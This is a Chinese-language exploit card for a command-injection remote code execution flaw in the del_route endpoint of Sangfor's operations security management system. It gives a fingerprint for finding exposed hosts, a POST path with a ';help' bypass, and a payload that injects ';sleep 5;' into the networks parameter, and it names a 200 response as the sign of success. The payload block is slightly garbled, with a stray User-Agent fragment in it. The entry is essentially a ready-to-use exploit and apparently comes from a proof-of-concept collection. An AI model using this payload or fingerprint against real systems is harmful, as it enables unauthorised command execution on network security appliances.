# 深信服运维安全管理系统del_route远程代码执行漏洞

深信服 ｜ 命令执行 ｜ —
- **指纹**：`body="/fort/login"`
- **请求**：`POST /fort/system;help/netConfig/del_route HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
ipv=4&flags=UG&gateways=1.1.1.1&networks=;sleep 5;&netmasks=255.255.255.0min
```
- **响应特征**：200